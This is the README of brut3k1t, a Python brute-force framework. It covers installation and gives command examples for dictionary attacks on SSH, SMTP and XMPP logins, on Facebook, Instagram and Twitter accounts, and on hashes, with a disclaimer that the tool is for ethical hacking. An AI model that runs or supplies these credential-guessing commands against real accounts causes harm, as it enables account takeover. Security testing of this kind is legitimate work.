# brut3k1t  

[![GitHub forks](https://img.shields.io/github/forks/ex0dus-0x/brut3k1t.svg)](https://github.com/ex0dus-0x/brut3k1t/network)
[![GitHub issues](https://img.shields.io/github/issues/ex0dus-0x/brut3k1t.svg)](https://github.com/ex0dus-0x/brut3k1t/issues)
[![GitHub license](https://img.shields.io/badge/license-AGPL-blue.svg)](https://raw.githubusercontent.com/ex0dus-0x/brut3k1t/master/LICENSE)

Brute-force framework.

## 0. Credit

Credit goes out to those who have helped with the overall design and implementation of this project.
The original design that inspired me to write a full-out bruteforce project was @chinoogawa, with the original __instaBrute__ design. Thanks!


## 1. Introduction

__brut3k1t__ is a  bruteforce framework that supports dictionary attacks for several protocols and services
The current protocols that are complete and in support are:

    ----------------
    Protocols:
    ----------------
    ssh
    ftp
    smtp
    xmpp
    telnet

    ----------------
    Webbased Services
    ----------------
    instagram
    facebook
    twitter

    ----------------
    Hashcrack
    ----------------
    md5
    sha1
    sha224


## 2. Installation

Downloading is simple. Simply `git clone`.

    $ git clone https://github.com/ex0dus-0x/brut3k1t

Change to directory:

    $ cd /path/to/brut3k1t

Run the Installer file (as root)

    $ ./installer

## 3. Troubleshooting

Before you actually send an issue through Github, please look through here before even trying to ask for help.

If you received any errors about dependencies, specifically `ImportError:` try to manually install the requirements. Here's how:

---

### a. Dependency Issues

Installing dependencies:

    sudo apt install build-essential libssl-dev libffi-dev python-dev

Make sure `firefox` is installed (default for most OS). If your operating system permits, install `firefoxdriver` as well.

Some people may see problems pertaining to `firefox` when utilizing `selenium`. Here is my (working) Firefox version:

    Mozilla Firefox 52.2.0

Installing `pip` modules

If you are using Ubuntu and derivatives, make sure to enable the `universe` repo!

    $ sudo add-apt-repository universe

Install pip, and all the dependencies in `requirements.txt`.

    $ sudo apt-get install python-pip
    $ sudo pip install -r requirements.txt

### a. Firefox/Geckodriver Issues

If you are getting an error such as `Can't load the profile. Profile Dir: /some/path`, or `'geckodriver' executable needs to be in PATH. `, that means that `selenium` can't find the path to `geckodriver`.

First, `sudo apt-get remove python-selenium`.

* Run the `installer`, this time choosing __Ubuntu / Parrot OS i386__ or __Ubuntu / Parrot OS amd64__ depending on your architecture. Running this will ensure that `geckodriver` will be installed into your `PATH`.

If you wish to do it manually, download the geckodriver [here](https://github.com/mozilla/geckodriver/releases/), and place the executable in your path (preferably `/usr/bin`).

This sort of issue occurs mostly in non-Kali Linux distributions, even in other Debian-based distros.

---

## 4. Usage

Utilizing __brut3k1t__ is a little more complicated than just running a Python file.

Typing `./brut3k1t -h` shows the help menu:

    usage: brut3k1t [-h] [-s] [-u USERNAME] [-w WORDLIST] [-a ADDRESS] [-p PORT]
                [-d DELAY]

    Bruteforce framework written in Python

    optional arguments:
      -h, --help            show this help message and exit
      -a ADDRESS, --address ADDRESS
                          Provide host address for specified service. Required
                          for certain protocols
      -p PORT, --port PORT  Provide port for host address for specified service.
                          If not specified, will be automatically set
      -d DELAY, --delay DELAY
                          Provide the number of seconds the program delays as
                          each password is tried

    required arguments:
      -s , --service        Provide a service being attacked. The Protocols and
                          Services supported are SSH, FTP, SMTP, XMPP, TELNET,
                          INSTAGRAM, FACEBOOK, TWITTER, MD5, SHA1, SHA224
      -u USERNAME, --username USERNAME
                          Provide a valid username/hashstring for
                          service/protocol/hashcrack being executed
      -w WORDLIST, --wordlist WORDLIST
                          Provide a wordlist or directory to a wordlist


Note that with the new release of the hashcrack feature, the `--username` flag is used to supply the target hashstring for hash cracking!

## 5. Examples of usage:

Cracking SSH server running on `192.168.1.3` using `root` and `wordlist.txt` as a wordlist.

    ./brut3k1t -s ssh -a 192.168.1.3 -u root -w wordlist.txt

The program will automatically set the port to 22, but if it is different, specify with `-p` flag.

Cracking email `test@gmail.com` with `wordlist.txt` on port `25` with a 3 second delay. For email it is necessary to use the SMTP server's address. For e.g Gmail = `smtp.gmail.com`. You can research this using Google.

    ./brut3k1t -s smtp -a smtp.gmail.com -u test@gmail.com -w wordlist.txt -p 25 -d 3

Cracking XMPP `test@creep.im` with `wordlist.txt` on default port `5222`. XMPP also is similar to SMTP, whereas you will need to provide the address of the XMPP server, in this case `creep.im`.

    ./brut3k1t -s xmpp -a creep.im -u test -w wordlist.txt

Cracking Facebook requires either the username (preferable, in this case, `test`), email, phone number, or even ID.

    ./brut3k1t -s facebook -u test -w wordlist.txt

Cracking Instagram with username `test` with wordlist `wordlist.txt` and a 5 second delay

     ./brut3k1t -s instagram -u test -w wordlist.txt -d 5

Cracking Twitter with username `test` with wordlist `wordlist.txt`

     ./brut3k1t -s twitter -u test -w wordlist.txt

Cracking a MD5 hash (where username is the hashstring) with wordlist `wordlist.txt`

    ./brut3k1t -s md5 -u 86bd1db79525abdd576165c1427f9bf6 -w wordlist.txt


## 6. KEY NOTES TO REMEMBER

 * If you do not supply the port `-p` flag, the default port for that service will be used. You do not need to provide it for Facebook and Instagram, since they are um... web-based. :)

 * If you do not supply the delay `-d` flag, the default delay in seconds will be 1.

 * Remember, use the SMTP server address and XMPP server address for the address `-a` flag, when cracking SMTP and XMPP, respectively.

 * Make sure the wordlist and its directory is specified. If it is in `/usr/local/wordlists/wordlist.txt` specify that for the wordlist `-w` flag.

 * Remember that some protocols are not based on their default port. A FTP server will not necessarily always be on port `21`. Please keep that in mind.

 * Use this for educational and ethical hacking purposes, as well as the sake of learning code and security-oriented practices. __No script kiddies!__

Thanks for trying out brut3k1t! I've been pretty lazy in terms of development and keeping this code updated and in track, so please __PLEASE__ report any sort of errors that arise (including false-positives).

## Contributing

If you have any proposed changes, please make a pull request or issue!

brut3k1t was designed as a pragmatic approach towards testing bruteforce attacks on various platforms. In no way does it endorse malicious hacking. Please do not support the use of this code as a method of advancing black-hat activites.

## License

[GPL-3.0](https://opensource.org/licenses/GPL-3.0)
